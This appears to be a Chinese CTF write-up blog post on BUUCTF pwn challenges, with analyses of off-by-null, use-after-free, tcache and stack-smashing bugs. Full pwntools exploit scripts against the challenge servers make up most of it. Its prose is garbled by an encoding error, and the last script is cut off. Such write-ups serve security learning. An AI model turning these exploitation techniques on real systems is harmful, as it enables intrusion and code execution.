    <content type="html"><![CDATA[<h1 id="BUUCTFåˆ·é¢˜è®°å½•"><a href="#BUUCTFåˆ·é¢˜è®°å½•" class="headerlink" title="BUUCTFåˆ·é¢˜è®°å½•"></a>BUUCTFåˆ·é¢˜è®°å½•</h1><h2 id="GKCTF-2020-demo"><a href="#GKCTF-2020-demo" class="headerlink" title="GKCTF 2020 demo"></a>GKCTF 2020 demo</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å¼€å¯äº†æ²™ç®±ï¼Œä¸è¿‡åœ¨mainå‡½æ•°çš„æœ€åï¼Œåœ¨whileå¾ªç¯é‡ŒåšåŠ¨ä½œå°±ä¸ä¼šè§¦å‘åˆ°ã€‚<br>å…¶ä¸­addå’Œfree å‡½æ•°ï¼Œä¸Šæ¥éƒ½ä¼šæ£€æµ‹<code>free_hook malloc_hook</code> æ˜¯å¦ä¸ä¸º0ï¼Œä¸ä¸º0å°±ä¸è®©è¿›è¡Œç›¸åº”çš„æ“ä½œã€‚</p><h4 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><pre><code class="c"> if ( (nbytes &amp; 0x80000000) == 0LL &amp;&amp; nbytes &lt;= 0x120 )        {          heaplist[SHIDWORD(nbytes)] = malloc(nbytes);          puts(&quot;content:&quot;);          read(0, heaplist[SHIDWORD(nbytes)], nbytes);          *(heaplist[SHIDWORD(nbytes)] + nbytes) = 0;// off by null          ++counts;        }</code></pre><p>Addä¸­å­˜åœ¨<code>OFF BY NULL</code>ã€‚</p><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>åˆ©ç”¨off by null æ„é€ ä¸€ä¸ªå †é‡å </li><li>æ³„æ¼å‡ºlibcåœ°å€</li><li>2æ¬¡é‡Šæ”¾é‡å çš„chunkï¼Œè¿›è¡Œfastbin attack <code>malloc_hook_</code>ä¸º one gadget</li><li>é€šè¿‡è¯»å…¥choiceçš„scanfå‡½æ•°ï¼Œä¼ é€å¤§é‡å­—èŠ‚ï¼Œå…¶ä¼šè°ƒç”¨mallocç”³è¯·chunkï¼Œå³å¯get shell</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./domo&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27019)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()&#39;&#39;&#39; line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009 0005: 0x15 0x03 0x00 0x0000000a  if (A == mprotect) goto 0009 0006: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0009 0007: 0x15 0x01 0x00 0xffffd8b6  if (A == 0xffffd8b6) goto 0009 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0009: 0x06 0x00 0x00 0x00000000  return KILL&#39;&#39;&#39;def add(size,data):    sla(&#39;&gt;&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&#39;tent&#39;,str(data))def free(idx):    sla(&#39;&gt;&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def show(idx):    sla(&#39;&gt;&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))add(0x80,&#39;1&#39;) add(0x68,&#39;1&#39;) add(0xf0,&#39;1&#39;)add(0x10,&#39;1&#39;) free(1)free(0)data = &#39;\x00&#39;*0x60+p64(0x100)add(0x68,data)free(2)add(0x80,&#39;\x00&#39;)add(0x68,&#39;\x00&#39;)add(0xf0,&#39;1&#39;)add(0x68,&#39;1&#39;)add(0x18,&#39;1&#39;)free(2)free(5)free(0)show(4)r()libc_base = uu64(r(6)) - 0x3c4b31info_addr(&#39;libc_base &#39;,libc_base)malloc_hook=libc_base+libc.symbols[&#39;__malloc_hook&#39;]realloc_hook=libc_base+libc.symbols[&#39;realloc&#39;]add(0x68,p64(malloc_hook-0x23))add(0x68,p64(malloc_hook-0x23))add(0x68,p64(malloc_hook-0x23))onegadget = 0x4526a + libc_basedata = &#39;\x00&#39;*0xb+p64(onegadget)+ p64(realloc_hook+realloc[0])add(0x68,data)sla(&#39;&gt;&#39;,&#39;1&#39;*500)# debug()itr()</code></pre><h3 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h3><ul><li>è¿˜å¯ä»¥æ”»å‡»<code>calloc_hook</code>,å› ä¸ºseccompé‡Œé¢è°ƒç”¨äº†callocã€‚</li><li>æ”»å‡»io file è¿›è¡Œæ³„æ¼å’Œorwã€‚ï¼ˆå…ˆç­‰å¾…å¤ç°ï¼‰<br><a href="https://github.com/Starssgo/pwn_challange/blob/master/domo/exp.py" target="_blank" rel="noopener">https://github.com/Starssgo/pwn_challange/blob/master/domo/exp.py</a></li></ul><h2 id="gyctf-2020-signin"><a href="#gyctf-2020-signin" class="headerlink" title="gyctf_2020_signin"></a><code>gyctf_2020_signin</code></h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>uafï¼Œä½†æ˜¯å­˜åœ¨ä¸€ä¸ªflagä½ç”¨äºæ£€æµ‹æ˜¯å¦freeè¿‡</li><li>editåªèƒ½ä¸€æ¬¡</li><li>å­˜åœ¨åé—¨å‡½æ•°ï¼Œå…¶ä¸­è¿˜ä¼šç”¨callocç”³è¯·ä¸€ä¸ªchunk,å¹¶ä¸”åªéœ€è¦<code>0x004040C0</code>å¤„æœ‰æ•°å€¼å³å¯è§¦å‘ã€‚</li></ul><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><h4 id="calloc-çš„ç‰¹æ€§ï¼š"><a href="#calloc-çš„ç‰¹æ€§ï¼š" class="headerlink" title="calloc çš„ç‰¹æ€§ï¼š"></a>calloc çš„ç‰¹æ€§ï¼š</h4><ul><li>åœ¨ç”³è¯·åˆ°çš„chunkä¸Šä¼šè¿›è¡Œä¸€ä¸ªç½®é›¶çš„æ“ä½œ</li><li>ä¸ä¼šä»tcache bin ä¸­å–chunk <h4 id="tcache-çš„-int-mallocæœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š"><a href="#tcache-çš„-int-mallocæœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š" class="headerlink" title="tcache çš„_int_mallocæœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š"></a>tcache çš„<code>_int_malloc</code>æœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š</h4></li></ul><p>åœ¨åˆ†é… fastbin ä¸­çš„ chunk æ—¶ï¼Œè‹¥æ­¤chainä¸Šè¿˜æœ‰å…¶ä»–chunk ï¼Œåˆ™è°ƒç”¨<code>tcache_put</code>æŠŠå®ƒä»¬å…¨éƒ¨æ”¾å…¥ tcache ä¸­(smallbinsä¸­ä¹Ÿæ˜¯å¦‚æ­¤)ã€‚</p><pre><code class="c">    /* While we&#39;re here, if we see other chunks of the same size,     stash them in the tcache.  */      size_t tc_idx = csize2tidx (nb);      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)    {      mchunkptr tc_victim;      /* While bin not empty and tcache not full, copy chunks over.  */      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count         &amp;&amp; (pp = *fb) != NULL)        {          REMOVE_FB (fb, tc_victim, pp);          if (tc_victim != 0)        {          tcache_put (tc_victim, tc_idx);    }        }    }</code></pre><h3 id="æ”»å‡»æ€è·¯-1"><a href="#æ”»å‡»æ€è·¯-1" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>ç”³è¯·8ä¸ªå †ï¼Œ é‡Šæ”¾8ä¸ªå †ï¼Œæœ€åä¸€ä¸ªä¼šè¿›å…¥fastbin</li><li>edit idx=8 çš„chunkï¼Œæ”¹å…¶fdä¸º<code>0x004040C0 - 0x10</code></li><li>ç”³è¯·ä¸€ä¸ªchunkï¼Œæ­¤æ—¶ä¼šåœ¨tcache chainä¸­æ‹¿èµ°ä¸€ä¸ªï¼Œç•™å‡ºä¸€ä¸ªç©ºä½</li><li>è°ƒç”¨åé—¨å‡½æ•°ï¼Œå…¶ä¸­callocä¼šä»fastbinä¸­æ‹¿å‡ºidx=8çš„chunkï¼Œä½†æ˜¯ç”±äºå…¶ç‰¹æ€§ï¼Œä¼šæŠŠå‰©ä¸‹çš„fdä¸Šåœ°å€ä¹Ÿå½“ä½œä¸€ä¸ªchunkä¸¢è¿›tcache</li><li>ä¸¢è¿›æ—¶æ˜¯ä¸¢åœ¨tcacheçš„å¤´éƒ¨ï¼Œæ‰€ä»¥ä¼šè·Ÿtcache è¿›è¡Œä¸€ä¸ªlinkã€‚ä¹Ÿå°±æ˜¯ä¼šåœ¨è¿™ä¸ªfdåœ°å€ä¸Šå†™ä¸‹ï¼Œtcache chain ä¸Šå…¶ç´§æŒ¨ç€çš„chunkåœ°å€ã€‚è¿™å°±é€ æˆä¸€ä¸ªä»»æ„åœ°å€å†™ã€‚</li></ul><p>æ¼æ´äº§ç”ŸåŸå› ä¹Ÿæ˜¯ï¼Œlibcæºç ä¸­<code>tcache_put</code>åŸºæœ¬æ²¡æœ‰å®‰å…¨æ£€æŸ¥ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &#39;./gyctf_2020_signin&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27592)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx):    sla(&#39;your choice?&#39;,&#39;1&#39;)    sla(&#39;idx&#39;,str(idx))def edit(idx,data):    sla(&#39;your choice?&#39;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))    s(str(data))def free(idx):    sla(&#39;your choice?&#39;,&#39;3&#39;)    sla(&#39;idx&#39;,str(idx))for i in range(8):    add(i)for i in range(8):    free(i)edit(7,p64(0x4040C0-0x10))add(8)sla(&#39;your choice?&#39;,&#39;6&#39;)debug()itr()</code></pre><h3 id="é¢˜è®°"><a href="#é¢˜è®°" class="headerlink" title="é¢˜è®°"></a>é¢˜è®°</h3><p>åœ¨åšçš„æ—¶å€™ï¼Œå¼€å§‹æœ‰ä¸ªæƒ³æ³•ï¼Œmallocç”³è¯·å †æ—¶ï¼Œä¼šåœ¨å…¶è¿”å›åœ°å€çš„ä¸Šæ–¹ç•™ä¸‹sizeä¿¡æ¯ï¼Œä»¥æ­¤æ¥åˆ©ç”¨ã€‚ä½†æ˜¯åœ¨éªŒè¯åï¼Œå‘ç°æ˜¯ä¸ä¼šçš„ã€‚</p><h2 id="gyctf-2020-document"><a href="#gyctf-2020-document" class="headerlink" title="gyctf_2020_document"></a><code>gyctf_2020_document</code></h2><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å­˜åœ¨uafæ¼æ´</li><li>åªèƒ½ç”³è¯·ä¸€ä¸ª0x20ã€0x90çš„å †å—ï¼Œä¸èƒ½è¿›è¡Œfastbinè¿›è¡Œæ”»å‡»ã€‚</li></ul><h4 id="personæ•°æ®ç»“æ„"><a href="#personæ•°æ®ç»“æ„" class="headerlink" title="personæ•°æ®ç»“æ„"></a>personæ•°æ®ç»“æ„</h4><pre><code>                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”                                  â”‚                      â”‚0x21â”‚                                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”¤                                  â”‚             â”‚             â”‚                                  â”‚   main_heap â”‚    flag     â”‚                                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                                  â”‚                       0x91â”‚                                  â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                                  â”‚             â”‚             â”œâ”€â”€â”€â”€â”€â”€â–¶0x10                       â”‚     name    â”‚      sex    â”‚                                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                                  â”‚                           â”‚                                  â”‚                           â”‚                                  â”‚                           â”‚                                  â”‚                           â”‚                                  â”‚                           â”‚                                  â”‚          data             â”‚                                  â”‚                           â”‚       â”Œâ”€â”€â”€â”€â”                     â”‚                           â”œâ”€â”€â”€â”€â”€â”€â–¶â”‚0x80â”‚                     â”‚                           â”‚       â””â”€â”€â”€â”€â”˜                     â”‚                           â”‚                                  â”‚                           â”‚                                  â”‚                           â”‚                                  â”‚                           â”‚                                  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                                              </code></pre><h3 id="æ”»å‡»æ€è·¯-2"><a href="#æ”»å‡»æ€è·¯-2" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>é‡Šæ”¾ä¸€ä¸ª0x90çš„å †ï¼Œåˆ©ç”¨uafè¿›è¡Œæ³„æ¼libc</li><li>ç”³è¯·2ä¸ªå †ï¼Œæ­¤æ—¶åœ¨è¿™ä¸ª0x90çš„unsortbinä¼šç•™ä¸‹2ä¸ª0x20çš„personæ•°æ®ç»“æ„çš„å¤´</li><li>editè¿™ä¸ªé‡Šæ”¾çš„å †ï¼Œæ§åˆ¶å…¶ä¸­<code>main_heap</code>çš„åœ°å€ï¼Œç„¶åè¿›è¡Œä»»æ„åœ°å€å†™ã€‚</li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &#39;./gyctf_2020_document&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,25009)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(name,sex,data):    sla(&#39;choice&#39;,&#39;1&#39;)    sa(&#39;name&#39;,str(name))    sa(&#39;sex&#39;,str(sex))    sa(&#39;infor&#39;,str(data))def show(idx):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;index&#39;,str(idx))def edit(idx,sex,data):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))    sa(&#39;sex&#39;,str(sex))    sa(&#39;infor&#39;,str(data))def free(idx):    sla(&#39;choice&#39;,&#39;4&#39;)    sla(&#39;index&#39;,str(idx))data = &#39;1&#39; * 0x78add(&#39;chumen77&#39;,&#39;W&#39;,data)add(&#39;chumen77&#39;,&#39;W&#39;,data)free(0)show(0)r()libc_base = uu64(r(6)) - 0x3c4b78info_addr(&#39;libc_base&#39;,libc_base)add(&#39;chumen77&#39;,&#39;W&#39;,data)add(&#39;chumen77&#39;,&#39;W&#39;,data)free_hook = 0x3c67a8 + libc_basedata = &#39;\x00&#39;* 8 + p64(0x71) + p64(free_hook-0x10) + &#39;\x01&#39; * 0x58edit(0,&quot;N&quot;,data)data = p64(libc_base + 0x4526a) + 0x68 * &#39;\x00&#39;edit(3,&#39;N&#39;,data)free(0)itr()</code></pre><h2 id="wdb-2018-guess"><a href="#wdb-2018-guess" class="headerlink" title="wdb_2018_guess"></a><code>wdb_2018_guess</code></h2><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¸»è¦å°±æ˜¯åˆ©ç”¨stack smashingã€‚</p><h4 id="stack-smashing"><a href="#stack-smashing" class="headerlink" title="stack smashing"></a>stack smashing</h4><h5 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h5><p>åœ¨ç¨‹åºå¯åŠ¨ canary ä¿æŠ¤ä¹‹åï¼Œå¦‚æœå‘ç° canary è¢«ä¿®æ”¹çš„è¯ï¼Œç¨‹åºå°±ä¼šæ‰§è¡Œ <code>__stack_chk_fail</code>å‡½æ•°æ¥æ‰“å° <code>argv[0]</code> æŒ‡é’ˆæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘äº†ç¨‹åºåã€‚å…¶ä»£ç å¦‚ä¸‹</p><pre><code class="c">void __attribute__ ((noreturn)) __stack_chk_fail (void){  __fortify_fail (&quot;stack smashing detected&quot;);}void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg){  /* The loop is added only to keep gcc happy.  */  while (1)    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);}</code></pre><p>æ‰€ä»¥è¯´å¦‚æœæˆ‘ä»¬åˆ©ç”¨æ ˆæº¢å‡ºè¦†ç›– <code>argv[0]</code> ä¸ºæˆ‘ä»¬æƒ³è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„åœ°å€ï¼Œé‚£ä¹ˆåœ¨ <strong><code>fortify_fail</code> å‡½æ•°ä¸­å°±ä¼šè¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ã€‚</strong></p><p>æ³¨æ„å…¶æ˜¯%sæ¥æ‰“å°ä¸œè¥¿çš„ï¼Œæ‰€ä»¥åœ¨åˆ©ç”¨æ—¶è¦ç”¨<code>argv[0]</code>åšä¸ªè·³æ¿ã€‚</p><h5 id="å¦‚ä½•è·å–æ ˆå€¼"><a href="#å¦‚ä½•è·å–æ ˆå€¼" class="headerlink" title="å¦‚ä½•è·å–æ ˆå€¼"></a>å¦‚ä½•è·å–æ ˆå€¼</h5><p><a href="https://blog.csdn.net/chennbnbnb/article/details/104035261" target="_blank" rel="noopener">https://blog.csdn.net/chennbnbnb/article/details/104035261</a></p><p>Libcä¸Šçš„<code>_environ</code>å­˜æ”¾ç€å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ï¼Œå…¶æ˜¯ä¸€ä¸ªæ ˆåœ°å€ã€‚</p><p>ä»¥æ­¤æ¥è·å–æ ˆå€¼ï¼Œç„¶åæ ¹æ®åç§»æ¥è®¿é—®æ ˆä¸­çš„æ•°æ®ã€‚</p><h3 id="æ”»å‡»æ€è·¯-3"><a href="#æ”»å‡»æ€è·¯-3" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>è·å–libcåŸºåœ°å€</li><li>è·å–stackåœ°å€ï¼Œæ ¹æ®åç§»æ‰¾åˆ°å­˜æ”¾flagçš„stack address</li><li>è¦†ç›–<code>argv[0]</code>ä¸ºflagçš„stack address</li></ul><p>å…¶ä¸­æ¯æ¬¡éƒ½æ˜¯ç”¨gets è¦†ç›–åˆ°è¦†ç›–<code>argv[0]</code>  ,stack smashingæ¥å®Œæˆã€‚</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &#39;./GUESS&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26813)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()data = &#39;1&#39; * 0x128 + p64(elf.got[&#39;__libc_start_main&#39;])sla(&#39;flag&#39;,data)ru(&#39;hing detected ***: &#39;)libc_base = uu64(r(6)) - 0x20740info_addr(&#39;libc_base&#39;,libc_base)data = &#39;1&#39; * 0x128 + p64(libc.sym[&#39;_environ&#39;] + libc_base)sla(&#39;flag&#39;,data)ru(&#39;hing detected ***: &#39;)stack_flag = uu64(r(6)) - 0x168info_addr(&#39;stack_base&#39;,stack_flag)data = &#39;1&#39; * 0x128 + p64(stack_flag)sla(&#39;flag&#39;,data)itr()</code></pre><h2 id="suctf-2018-basic-pwn"><a href="#suctf-2018-basic-pwn" class="headerlink" title="suctf_2018_basic pwn"></a><code>suctf_2018_basic pwn</code></h2><p>æ— è„‘æ ˆæº¢å‡º</p><pre><code class="python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &#39;./SUCTF_2018_basic_pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,25741)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()data = &#39;1&#39; * 0x118 + p64(0x000000401157)sl(data)itr()</code></pre><h2 id="SWPUCTF-2019-p1KkHeap"><a href="#SWPUCTF-2019-p1KkHeap" class="headerlink" title="SWPUCTF_2019_p1KkHeap"></a><code>SWPUCTF_2019_p1KkHeap</code></h2><h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å¼€äº†æ²™ç®±ï¼Œå¯ä»¥orwæ‹¿åˆ°flag</li><li>åŠŸèƒ½åªèƒ½è°ƒç”¨18æ¬¡ï¼Œfreeåªèƒ½3æ¬¡</li><li>freeä¸­å­˜åœ¨uaf</li><li>mmapäº†ä¸€å— rwxçš„å†…å­˜åœ¨ <code>0x66660000</code></li></ul><h3 id="æ”»å‡»æ€è·¯-4"><a href="#æ”»å‡»æ€è·¯-4" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>æ³„æ¼heap baseï¼Œå‡†å¤‡æ”»å‡»tcache binçš„è¡¨å¤´</li><li>è¦†ç›–bin countsä¸º7ï¼Œä¼ªé€ æ»¡binï¼Œfree chunkï¼Œæ³„æ¼libc</li><li>æ”»å‡»tcache binçš„è¡¨å¤´ä¸­bin chunk header çš„éƒ¨åˆ†ï¼Œæ”¾ä¸‹<code>0x66660000</code> å’Œ<code>malloc_hook</code>ï¼Œå‡†å¤‡ä¿®æ”¹è¿™ä¸¤ä¸ªéƒ¨åˆ†ã€‚</li><li>åœ¨<code>0x66660000</code>çš„å†…å­˜ä¸Šå†™ä¸‹orwçš„shellcode</li><li>æ”»å‡»<code>malloc_hook</code>ä¸º<code>0x66660000</code> å–å¾—flag</li></ul><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &#39;./SWPUCTF_2019_p1KkHeap&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,29911)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()&#39;&#39;&#39;================================================================================ line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011 0004: 0x15 0x06 0x00 0x0000003b  if 